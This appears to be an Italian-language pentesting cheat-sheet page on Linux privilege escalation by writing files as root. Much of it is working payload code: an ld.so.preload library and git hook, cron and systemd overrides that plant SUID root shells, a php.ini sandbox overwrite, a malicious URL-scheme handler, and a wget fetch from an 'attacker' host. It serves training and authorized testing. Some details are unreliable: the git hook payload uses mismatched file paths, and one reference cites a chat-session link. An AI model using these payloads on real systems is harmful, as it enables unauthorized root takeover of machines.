# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`** ma funziona anche nelle **SUID binaries**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **path a una libreria che verrà caricata** con ogni binario eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git, come quando viene creato un commit, una merge... Quindi se uno **script o utente privilegiato** esegue queste azioni frequentemente ed è possibile **scrivere nella cartella `.git`**, questo può essere usato per **privesc**.

Per esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & file temporali

Se puoi **scrivere file correlati a cron che vengono eseguiti da root**, di solito puoi ottenere l'esecuzione di codice la prossima volta che il job viene eseguito. Obiettivi interessanti includono:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi di abuso tipici:

- **Append a new root cron job** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Replace a script** già eseguito da `run-parts`
- **Backdoor an existing timer target** modificando lo script o il binario che avvia

Esempio minimo di cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory di cron usata da `run-parts`, deposita lì un file eseguibile invece:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` di solito ignora i nomi di file che contengono punti, quindi preferisci nomi come `backup` invece di `backup.sh`.
- Alcune distro usano `anacron` o `systemd` timers invece del classico cron, ma l'idea di abuso è la stessa: **modificare ciò che root eseguirà più tardi**.

### Service & Socket files

Se puoi scrivere **`systemd` unit files** o file a cui questi fanno riferimento, potresti riuscire a ottenere esecuzione di codice come root ricaricando e riavviando l'unità, o aspettando che venga innescato il percorso di attivazione service/socket.

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Percorsi di abuso comuni:

- **Sovrascrivi `ExecStart=`** in un'unità di servizio posseduta da root che puoi modificare
- **Aggiungi un drop-in override** con un `ExecStart=` malevolo e rimuovi prima quello vecchio
- **Backdoor lo script/binary** già referenziato dall'unità
- **Hijack un servizio socket-activated** modificando il corrispondente file `.service` che si avvia quando il socket riceve una connessione

Esempio di override malevolo:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso tipico di attivazione:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare i servizi da solo ma puoi modificare un'unità attivata da socket, potrebbe essere sufficiente **attendere una connessione client** per far scattare l'esecuzione del servizio backdoored come root.

### Sovrascrivere un `php.ini` restrittivo usato da una PHP sandbox privilegiata

Alcuni daemon personalizzati validano PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (per esempio, `disable_functions=exec,system,...`). Se il codice nella sandbox ha ancora **qualsiasi write primitive** (come `file_put_contents`) e puoi raggiungere l'**esatto `php.ini` path** usato dal daemon, puoi **sovrascrivere quella config** per rimuovere le restrizioni e poi inviare un secondo payload che viene eseguito con privilegi elevati.

Flusso tipico:

1. First payload sovrascrive la config della sandbox.
2. Second payload esegue codice ora che le funzioni pericolose sono nuovamente abilitate.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o effettua controlli su percorsi di proprietà di root), la seconda esecuzione fornisce un contesto root. Questo è essenzialmente **privilege escalation via config overwrite** quando l'ambiente sandboxato può ancora scrivere file.

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. TODO: verificare i requisiti per abusarne e lanciare una rev shell quando un tipo comune di file viene aperto.

### Sovrascrivere i gestori di schema (come http: or https:)

Un attaccante con permessi di scrittura nelle directory di configurazione della vittima può facilmente sostituire o creare file che cambiano il comportamento del sistema, portando a esecuzione di codice non voluta. Modificando il file `$HOME/.config/mimeapps.list` per puntare i gestori URL HTTP e HTTPS a un file dannoso (ad esempio impostando `x-scheme-handler/http=evil.desktop`), l'attaccante si assicura che **cliccare su qualsiasi link http o https attivi il codice specificato in quel file `evil.desktop`**. Per esempio, dopo aver inserito il seguente codice dannoso in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi click su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per maggiori informazioni consulta [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) dove è stato usato per sfruttare una vulnerabilità reale.

### Root che esegue script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:

- **Rileva l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare root che invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Verifica la scrivibilità:** assicurati che sia il target file sia la directory che lo contiene siano di proprietà del tuo utente e scrivibili.
- **Hijack the target:** esegui il backup del binary/script originale e inserisci un payload che crea una SUID shell (o qualsiasi altra azione root), poi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (es. premendo un pulsante dell'UI che avvia l'helper). Quando root riesegue il hijacked path, cattura la shell con privilegi elevati usando `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
